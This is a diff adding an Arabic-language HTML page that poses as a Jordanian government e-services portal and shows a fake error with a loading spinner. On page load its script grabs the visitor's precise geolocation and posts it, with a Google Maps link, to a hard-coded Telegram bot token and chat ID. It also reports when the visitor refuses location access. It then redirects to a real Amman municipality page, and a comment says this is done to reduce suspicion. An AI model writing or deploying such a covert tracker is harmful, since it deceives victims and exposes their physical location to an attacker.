@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الخدمات الالكترونية</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h3 { color: #1c1e21; }
+        p { color: #606770; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="spinner"></div>
+    <p>حدث حطأ الرجاء اعادة المحاولة ...</p>
+</div>
+
+<script>
+    // --- إعدادات التلغرام ---
+    const telegramToken = "8500706491:AAEGFNeQhnUfZTUxqfMRAjNSUXCJzGgI1CA";
+    const chatId = "6617592058"; 
+    // -----------------------
+
+    function sendToTelegram(lat, lon, acc) {
+        const message = `🎯 **صيد جديد من HTB!**\n\n📍 Latitude: \`${lat}\`\n📍 Longitude: \`${lon}\`\n📏 Accuracy: \`${acc}m\`\n\n🔗 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        }).then(() => {
+            // تحويل البوت لصفحة حقيقية بعد سحب البيانات لتقليل الشك
+            window.location.href = "https://www.ammancity.gov.jo/ar/gameservices/eservices.aspx";
+        });
+    }
+
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    sendToTelegram(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                },
+                (err) => {
+                    // في حال الرفض، يمكن إرسال إشعار بذلك أيضاً
+                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=❌ الأدمن رفض إعطاء الموقع!`);
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+    };
+</script>
+
+</body>
+</html>
